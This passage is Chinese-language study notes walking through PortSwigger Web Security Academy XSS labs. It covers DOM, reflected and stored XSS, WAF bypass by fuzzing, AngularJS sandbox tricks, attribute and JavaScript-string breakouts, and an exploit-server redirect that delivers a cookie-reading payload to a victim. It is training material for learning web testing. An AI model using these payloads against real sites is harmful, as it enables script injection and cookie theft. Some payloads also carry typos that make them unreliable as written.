  href="javascrip:alert(1)"
  ```

  就能直接执行，无需逃逸结构。

  凡是可以写入 `href` 的DOM XSS，往往都可以直接注入 `javascript:`

#### Solved:

1. **深度解析题目**

   本题需要注意的就是`jQuery` `href` 属性

   看到这两个关键词就理应知道本题可以在直接执行`javascript:`

2. 打开element面板，查看context 结构，搜索关键词，如 `href` `$`

   查看结构，理解结构：

   本题中的`returnPath` 可以直接在URL中修改，修改一下值，再去element面板中查看所修改的值所在的上下文的结构。

3. 根据`href` 知识点和context上下文的结构，得出`payload`

4. ```
   ?returnPath=javascript:alert(1)
   ```





### LAB:DOM XSS in jQuery selector sink using a hashchange event

#### Question:

该实验室主页存在基于DOM的跨站脚本漏洞。其利用jQuery的`$()` 选择器函数实现自动滚动至指定帖子，该帖子的标题通过`location.hash` 属性传递。

要完成该实验，需向受害者发送一个漏洞利用程序，该程序会在其浏览器中调用`print()` 函数。

#### Pain POint:









### LAB:DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

#### Question:

本实验室在搜索功能中的AngularJS表达式中包含基于DOM的跨站脚本漏洞。

AngularJS 是一个流行的 JavaScript 库，它扫描包含`ng-app`该属性（也称为 AngularJS 指令）的 HTML 节点的内容。当向HTML代码添加指令时，你可以在双大括号内执行JavaScript表达式。当编码角括号时，这种技术非常有用。

要解决这个实验，可以执行跨站脚本攻击，执行AngularJS表达式并调用该`alert`函数。

#### Pain Point:

- 关于AngularJS的知识点：
  当一个HTML元素带有 `np-app` 或其他 Angular指令时，AngularJS会：

  - 扫描该元素中的内容
  - 解析和执行其中的表达式

- 为什么用户输入能进入 Angular表达式？
  在搜索框输入内容的时候，页面会把搜索词直接放在一个带有 `np-app` 的HTML节点中：

- 如何查看context结构：

  ```
  三种方式都要查看一遍：
  1.element面板
  2.源代码
  3.burp suite 拦截请求，查看response
  ```

- payload原理：

  在Angular中：

  `{{}}` 中可以执行表达式

  ```
  {{$on.constructor('alert(1)')()}}
  $on是一个可用在作用域上的函数引用
  它实际上是一个scope方法，因此你可以用它的原型链接访问Function构造器
  .constructor返回function构造器
  $on.constructor===Function
  使用function构造器执行任意JS
  Function("alert(1)")()
  =
  eval("alert(1)")
  
  虽然这几个是等价的，但是AngularJS中不允许用这些。
  ```



#### Solved:

1. 先在搜索框中测试一个字符串
2. 在element和源码中查看字符串所在的context
3. 也可以在burp suite中拦截请求看一下response
4. 结合题目与context，查看有关`np-app` 和AngularJS的语法
5. 构建payload









## XSS contexts

在测试反射型和存储型XSS时，关键任务在于识别XSS上下文。

- 响应攻击者可控数据出现的位置
- 应用程序对该数据执行的如何输入验证或其他操作。

基于这些细节，你可以选择一个或多个XSSpayload，并测试他们是否有效。

XSS cheat sheet:https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

这份速查表用于辅助测试WEB应用程序和过滤器(filters)。可以通过事件和标签进行筛选，查看哪些攻击向量需要用户交互。该速查表还包含AngularJS沙箱逃逸技术及其它多个板块。



### XSS between HTML tags

当XSS的上下文时HTML标签之间的文本时，需要引入一些专门设计用于触发JavaScript执行的全新HTML标签。

执行JavaScript的几种有效方式包括：

```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```



#### LAB:Reflected XSS into HTML context with most tags and attributes blocked

#### Question:

该实验室的搜索功能存在反射型跨站脚本攻击漏洞，但通过Web应用防火墙（WAF）抵御了常见的跨站脚本攻击向量。

要完成该实验，需执行一次跨站脚本攻击，该攻击需绕过WAF并调用`print()` 函数。

**注 :**

您的解决方案不得需要任何用户交互。在浏览器中手动触发`print()` 调用无法完成本实验

#### Pain POint:

- 本题重点：WEB应用防火墙抵御了XSS攻击向量

  核心：输入被反射到HTML上，但是大多数标签/属性/事件被过滤或者阻断——我们通过枚举找出仍然允许的标签/事件，然后构造一个能触发的链（闭合属性/标签——插入可执行元素——触发事件）。

  而burp intruder 用来“探测哪些标签/属性/事件能通过过滤器”

- 如何用burp枚举出event/tag

  1. 定位注入点，找到页面把search或message等GET/POST参数反射回页面的位置，本题中的URL参数search。
  2. 再burp中把参数位置标成payload变量 ADD$
  3. 准备字典（cheat sheet）
  4. 把字典放入intruder，start attack。
  5. 基于幸存的语法元素构建复杂的payload。

- payload逐步分解：

  ```
  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
  ```

  该payload是经过URL编码过的。

  ```
  解码：
  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?
  search="><body onresize=print()>" onload=this.style.width='100px'
  ```

  `"><body onresize=print()>` 

  `">` 结束src="的引号和iframe的尖括号。然后插入一个新的HTML元素。

  `onload=this.style.width='100px'` 

  这是直接加在外层 `<iframe>`标签上的属性：当iframe加载完毕,浏览器就会执行`onload` ，把该iframe的宽度设置成100px，这样有可能导致iframe内部布局或窗口尺寸发生变化，从而触发<body>的onresize事件。

- payload构造的通用逻辑：

  1. 闭合

  2. 注入：

     注入一个能通过过滤器且可以携带事件/执行的元素，比如：

     ```
     <svg onload=....> <body onresize...> <div onfocus=...>等（取决于幸存者）
     如果href/src接受JavaScript协议，也可能直接注入javascript:
     ```

  3. 触发（trigger）

     注入只是让执行的”器具“存在，还需要触发条件：

     ```
     onload:在元素加载的时候触发，常与<img>/<iframe>/<svg>联合使用
     onerror：在加载失败的时候触发
     onresize：需要触发resize(可以通过外层操作尺寸实现)
     onfocus:需要focus(可用JS focus()或tabindex+用户交互)
     ```

     触发器要与注入元素的context匹配，最好能自动触发以避免人工交互。

- 本题中的闭合，注入，触发：

  1. 闭合
  2. 注入：body带事件，这里body被发现是一个能够幸存的标签，onresize是幸存的事件
  3. 触发：外层iframe的onload属性被设置为 `this.style.width='100px'` ，iframe加载时回修改iframe的尺寸，从而导致子文档触发resize，执行print()
  4. 简单理解：你通过 `iframe.src` 把 payload 送到子页面，在子页面把 `body onresize` 写出来；外层再通过 `onload` 改变大小触发 `onresize`，连锁执行 `print()`。

- 效果链：

  payload先通过URL参数进入目标页面并插回HTML——关闭了外层的属性。标签，插入body——外层iframe的onload触发后改变大小，导致子文档触发resize，执行print()

#### Solved:

1. 









#### LAB:Reflected XSS into HTML context with all tags blocked except custom ones

#### Question:

该实验室屏蔽所有HTML标签，自定义标签除外。

要完成该实验，需执行一次跨站脚本攻击，注入自定义标签并自动向`document.cookie` 发送警报。

#### Pain POINT:

- 什么是自定义标签

  HTML标志里本来有固定的标签:<div><script><img><p>

  但是浏览器其实允许你写不存在于HTML标准中的标签，只要它不包含被过滤规则则禁止的字符。

  例如：

  ```
  <xss>Hello</xss>
  <foo>bar</foo>
  ```

  浏览器不会报错，它会把这些当作”未知元素“，但仍然会：

  - 把他们加入到DOM
  - 允许你为他们添加属性
  - 允许事件触发（onfocus onclick）

- payload：

  ```
  <script>
  location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
  </script>
  ```

  真正的payload：

  ```
  %3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E
  <xss id=x onfocus=alert(document.cookie) tabindex=1>
  ```

  - `id=x`

    给标签一个id,这样URL中的 `#x` 可以focus它

  - `onfocus=alert(document.cookie)`

    当元素被focus时执行JavaScript

  - `tabindex=1`

    让自定义标签可被focus的元素，如果不加`tabindex` ，普通的unknown element不能自动获得焦点，focus事件不会触发。

  - `#x`

    浏览器加载页面之后：

    会自动跳转到ID为x的元素处，并触发focus行为

  `#x`——强制让<xss>获得焦点——触发onfocus——弹框

- 为什么payload要编码？

  因为把payload放在了URL的search参数中。

- 为什么这段代码要放在exploit server中执行？
  因为这个LAB的目标是：“Deliver the exploit to the victim（向受害者发送漏洞利用）”

  也就是说：

  - 不能直接访问漏洞页面触发alert
  - 必须让实验服务器中的受害者浏览器去访问
  - 浏览器访问你控制的exploit server
  - exploit server重定向受害者到带有XSS payload的URL
  - 所以XSS必须有victim触发，而不是你自己。

- exploit server的作用：

  1. 托管你控制的HTML/script
  2. 帮助你伪造一个攻击者站点
  3. 自动Deliver exploit to victim来触发XSS

- 为什么要使用<script></script>,而不是直接连接

  受害者必须自动加载带payload的URL

  所以受害者访问exploit server的时候，<script>就会自动执行。



#### Solved:

1. 读懂题目，了解什么是自定义标签以及相关知识点









#### LAB：Reflected XSS with some SVG markup allowed

#### Question:

该实验室存在一个简单的反射型跨站脚本漏洞。该网站虽拦截了常见标签，但遗漏了某些SVG标签及事件。

要完成该实验，请执行一次跨站脚本攻击，调用`alert()` 函数。

#### Pain POint:

- 如何在几个没有被blocked的tag or event中找到需要用的

  1. 不是所有的tag都可以执行JS,能自动触发

     **svg中能自动执行事件的标间通常是：**

     ```
     <svg><animate><animatetransform><set>
     ```

  2. 在允许的events中能找到“自动触发的”

     ```
     onload 自动触发     <svg><image>
     onbegin 动画开始时触发     <animate>
     onrepeat 动画重复时触发     <animate>
     onend  动画结束触发         <animate>
     onclick    需要点击       
     ```

  3. 组合方式很固定：

     ```
     方法A：
     <svg onload=alert(1)>
     方法B：
     <svg><animatetransform onbegin=alert(1) attributeName=x dur=1s>
     ```

- 为什么在遍历event的换搜索词

  因为在fuzz tag的时侯，只在意tag是否被过滤

  但是fuzz event 的时候，事件属性必须存在于标签内部：

  ```
  <svg onload=1>
  <animatetransform onbegin=1>
  ```

  但是不同标签是否允许事件也受标签类型影响。

  SVG中：

  - onload 必须在<svg>或<image>上才有效
  - onbegin必须在<animate>标签上才有效

  所以fuzz事件时，必须嵌套在一个能接受的标签里面。

  所以，本题中用的固定标签就是：

  ```
  <svg <$event$>=1>  or
  <svg><animatetransform<$event$>=1>
  ```

- 为什么题解的搜索词：<svg><animatetransform%20=1>要编码

  因为WAF对语法敏感。

- 重点：看request的raw中的search=后面的是否编码，若是编码过的，那么在搜索词和payload的时候都要编码。

  ```
  %3Csvg%3E%3Canimatetransform%20%3D1%3E
  ```

- 最后为什么没有在搜索框中输入payload而是在URL后面加payload呢？

  1. 搜索框本身会对输入自动编码转义，因此：payload必须精确的控制编码，两端不能以来浏览器自动处理。
  2. 搜索框展示的输入与实际发送的输入可能不同。

#### SOlved:

1. 看到题目就想到需要在burp intruder中fuzz tag和event。

2. 先在搜索框中输入一个标准的XSS payload

   ```
   <img src=1 onerror=alert(1)>
   ```

3. 拦截该请求，发送至burp intruder。

4. 在burp intruder中修改search的值来测试tag和event。

5. 在payload configuration中增加list

6. 测试tag:

   ```
   <$$>
   result:
   status code为200：svg,title,animatetransform
   ```

7. 测试event：

   ```
   %3Csvg%3E%3Canimatetransform%20$$%3D1%3E
   result:
   status code为200:onbegin
   ```

8. 再构建payload：

   ```
   %22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
   ```





### XSS in HTML tag attributes

HTML标签属性中的XSS

当XSS的context位于HTML标签属性值中，有时候可能能够终止该属性值，关闭当前标签并引入新标签。例如：

```
"><script>alert(doucument.domain)</script>
```

在这种情况下，尖括号通常会被屏蔽或编码，因此你的输入无法突破其所在的标签限制。

只要能够终止属性值，通常可以引入一个新的属性来创建可编写脚本的环境，例如事件处理程序。

例如：

```
" autofocus onfocus=alert(document.domain) x="
```

上述payload会创建一个onfocus事件，当元素获得焦点的时候将执行JavaScript代码，同时添加`autofocus` 属性以尝试在无需用户交互的情况下自动触发 `onfocus` 事件。最后，它添加 `x="` 属性以优雅修复后续标记。

------

#### LAB：Reflected XSS into attribute with angle brackets HTML-encoded

#### Question:

本实验室在搜索博客功能中存在跨站脚本的反映漏洞，其中角括号是HTML编码的。要解决这个实验，可以进行跨站脚本攻击，注入一个属性并调用该alert函数。

Hint :

仅仅因为你能自己触发alert() ，并不意味着这在受害者身上也有效。你可能需要尝试用各种不同的属性注入你的概念验证有效载荷，才能找到能在受害者浏览器中成功执行的那个。

#### Pain POint:

- 属性（attribute）的概念：

  1.当你看到一个HTML标签，例如：

  ```html
  <input type="text" value="hello">
  ```

  type，value就是属性。

  2.事件属性（可以执行JS）

  - onclick=
  - onfocus=
  - onmouseover=
  - onload=

  这些属性一旦被触发，就能执行JavaScript。

  例如：

  ```html
  <input type="text" onfocus="alert(1)">
  ```

  当这个输入框获得焦点的时候，就会允许alert(1)

- 为什么本题需要注入属性?

  因为在搜索框输入的内容被放在某个属性中：

  ```html
  <input type="text" value="YOUR-SEARCH">
  ```

  而你需要注入的地方就在这个属性里面，所以需要跳出，但是在这道题目中，`<>` 被转义，所以不能注入<script>.

  所以你就需要：**闭合属性值，注入新属性。**

  ```
  "     闭合属性值    html中变成   <input value="">
  autofocus onfocus=alert(1)     加上自己的属性
  在浏览器最终看到：
  <input value="" autofocus=alert(1)>
  ```

  所以浏览器加载页面时会自动触发onfocus——alert()

#### SOlved:

1. 在搜索框中随意输入一个字符串

2. 在burp repeater中send，观察其结构。

3. 由于<>会被转义，所以在标签中加上自己的属性。

4. ```
   " autofocus onfocus=alert(1) "
   ```

------



有时候XSS的执行环境存在于某种HTML标签属性中，该属性本身可形成可执行脚本的环境。

在此环境下，无需终止属性值即可执行JavaScript。

例如：若XSS环境存在于锚标签的`href` 属性中，则可利用 `javascript` 伪协议中执行脚本，例如：

```html
<a href="javascript:alert(document.domain)"></a>
```

------



#### LAB：Stored XSS into anchor `href`  attribute with double quotes HTML-encoded

#### Question:

本实验的评论功能存在存储型跨站脚本漏洞。要解决此实验，请提交一条评论，当点击评论作者姓名时调用`alert` 函数。

#### Pain POint:

- 注入点！！

  本题根据题目可以看出，XSS攻击存储在锚点href中，所以我们要寻找注入点。在href中的存储。

  本题中一共有 comment,name,website.

  一个个试，就可以看到website就是那个注入点。因为href的特性。所以可以直接输入payload：

  ```html
  javascript:alert(1)
  ```

#### SOlved:

1. 在评论区的几个地方都填上测试字符串，POST
2. POST之后刷新页面
3. 查看element，搜索测试字符串，就可以看到相应的context。
4. 根据context找到href，构建payload。

------



即使网站把 `< >` 做了编码处理（例如变成 `<`、`>`）以阻止脚本注入，有些属性仍然可能被错误地“放行”，从而导致意外的行为触发。

你还有可能会遇到对尖括号进行编码但仍允许注入属性的网站，有时候，即使在通常不会自动触发事件的标签内（如规范标签），这类注入操作依然可行。

也就是说：

- 虽然你不能插入<script>标签
- 但你仍然可能插入属性
- 浏览器看到属性，就会解析它

某些特殊标签不会自动触发执行事件：

```html
<link> <meta> <title>
通常：
    <link rel="canonical" href="xxx" onclick="alert(1)">
浏览器不会因为你点不点它而执行事件。
```

你可以利用chrome浏览器的访问键和用户交互功能来利用此特性。访问键允许你为特地元素设置键盘快捷键。通过 `accesskey` 属性，可定义特定字母组合（不同平台组合键位各异）触发事件。在后续实验中，你将事件访问技术并利用规范标签漏洞。

但chrome的"accesskey"是例外：

`accesskey` 是浏览器提供的功能：

- 允许某个元素被键盘快捷键”激活“
- 激活时会产生类似”用户交互“的效果
- 某些事件可以因此被触发



------



#### LAB:Reflected XSS in canonical link tag

#### Question:

该实验室在规范链接标签中反映用户输入，并对尖括号进行转义。

要完成该实验，需对主页执行跨站脚本攻击，注入调用`alert` 函数的属性。

为协助您实施漏洞利用，可假设模拟用户将按下以下键盘组合：

```
ALT+SHIFT+X
CTRL+ALT+X
Alt+X
```

#### Pain POint:

- 构建payload：（accesskey的相关语法）

  ```
  https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
  ```

  解码后：

  ```
  ?'accesskey='x'onclick='alert(1)
  ```

  把他插入到<link>模板中，结果大概是：
  
  ```html
  <link rel="canonical" href="'accesskey='x'onclick='alert(1)">
  ```
  
  







------

### XSS into JavaScript

当XSS的攻击载体是响应中已存在的JavaScript代码时，可能出现多种情况，需要采用不同的技术才能成功实施攻击。

#### Terminationg the existing script

终止现有脚本

在最简单的情况下，只需关闭包裹现有JavaScript的script标签，并引入一些能触发JavaScript执行的新HTML标签即可。

例如：若XSS的上下文如下：

```html
<script>
...
var input = 'controllable data here';
...    
</script>
```

那么你可以使用以下payload来跳出现有的JavaScript并执行自己的代码：

```html
</script><img src=1 onerror=alert(document.domain)>
```

此方法奏效的原因在于：

浏览器首先执行HTML解析以识别页面元素（包括脚本块），随后才进行JavaScript解析以理解并执行嵌入的脚本。上述payload会破坏原始脚本，使其包含未终止的字符串字面量。但这并不妨碍后续脚本以常规方式被解析和执行。



------

#### LAB:Reflected XSS into a JavaScript string with single quote and backslash escaped

#### Question:

该实验室的搜索查询跟踪功能存在反射型跨站脚本漏洞。反射攻击发生在包含单引号和转义反斜杠的JavaScript字符串内部。

要完成本实验，请执行一次跨站脚本攻击，该攻击需突破JavaScript字符串限制并调用`alert` 函数。

#### Pain POint:

- 无

#### SOlved:

1. 用burp拦截请求，发送至repeater，查看response

2. 观察response的结构：

   ![image-20251205204134460](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251205204134460.png)

   他的上下文确实很简单，就是<script></script>所以只需要闭合一下标签，写出自己的恶意代码就行。

3. ```
   </script><img src=1 onerror=alert(1)>
   ```



------

#### Breaking out of a JavaScript string

当XSS上下文位于带引号的字符串字面量内部的时候，通常能够突破字符串限制并直接执行JavaScript代码。

修复XSS上下文的脚本至关重要，因为该处的任何语法错误都会导致整个脚本无法执行。

脱离字符串字面量的一些有用的方法包括：

```html
'-alert(document.domain)-'
';alert(document.domain)//
```



------

#### LAB:Reflected XSS into JavaScript string with angle brackets HTML encoded

#### Question:

本实验在搜索查询跟踪功能中存在反射型跨站脚本漏洞，该漏洞涉及尖括号的编码处理。反射攻击发生在JavaScript字符串内部。要解决此实验，需执行一次跨站脚本攻击，使攻击代码突破JavaScript字符串限制并调用`alert` 函数。

#### Pain POint:

无

#### Sovled:

1. 拦截请求，在repeater中send request

2. 查看response

   ![image-20251205205032802](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251205205032802.png)

3. 除了上个LAB的方法之外，当带引号的时候，可以通过突破引号的方法来执行JavaScript代码：

   ```
   ';alert(1)'-  注释
   ```

   



------

某些应用程序试图通过在单引号前添加反斜杠来转义，从而防止输入脱离JavaScript字符串的范围。

字符前的反斜杠会告知JavaScript解析器该字符应被视为字面值，而非字符串终止符等特殊字符。在此情况下，应用程序常会犯下未对反斜杠字符本身转义的错误。

这意味着攻击者可利用其自身的反斜杠字符，来中和应用程序的反斜杠转义效果。

例如，如果输入为：

```
';alerr(document.domain)//
```

转换为：

```
\';alert(document.domain)
```

现在你可以使用替代payload:

```
\';alert(document.domain)//
```

转换为：

```
\\';alert(document.domain)//
```

此处，第一个反斜杠表示第二个反斜杠讲被视为字面意义，而非特殊字符。

这就意味着引号被解释为字符串终止符，因此攻击成功。



------

#### LAB:Reflected XSS into a JavaScript string with angle brackets and double quptes HTML-encoded and single quotes escaped

#### Question:

该实验室的搜索查询跟踪功能存在反射型跨站脚本漏洞，其中尖括号和双引号经过HTML编码处理，单引号则被转义。

要完成本实验，请执行一次跨站脚本攻击，该攻击需突破JavaScript字符串限制并调用`alert` 函数。

#### Pain POint:

- 转义和编码！payload的解释：

  关键就是单引号会被转义，转译为`\'` ,那么我们就可以利用这个反斜杠来逃逸这个机制！

  而反斜杠不会被转义（经过测试）

  所以我们就可以根据这个来构建payload：

  ```
  \'-alert(1)//  ——————   \\'-alert(1)//    ——————   \'-alert(1)//
  两个反斜杠就会被转义成一个反斜杠
  ```

  所以，前面的字符串闭合了，只留后面的 `-alert(1)` 

  又为什么是 `-` 呢，因为，alert(1) 是错误语法，在JavaScript中不能函数打头。



#### Sovled:

1. 先拦截请求，发送至repeater中测试
2. 测试各种字符的转义情况
3. 根据转义情况构建payload。



------

某些网站通过限制可使用的字符来增加XSS攻击的难度。这种限制可能来自网站层面的设置，也可能是部署了阻止请求到达网站的WAF。在这种情况下，需要尝试其他调用函数的方式来绕过这些安全措施。

其中一种方法就是使用 `throw` 语句配合异常处理程序，这允许在不使用括号的情况下向函数传递参数。

以下代码将`alert()` 函数赋值为全局异常处理程序，，`throw` 语句将1传递至异常处理程序(此处为alert()).

最终效果是alert() 函数被调用，其参数为1.

```
onerror=alert;throw 1
```

有多种方法可以使用这种技术来调用不带括号的函数。

下一个实验演示了一个过滤特定字符的网站。

------



















------

#### Making using of HTML-encoding

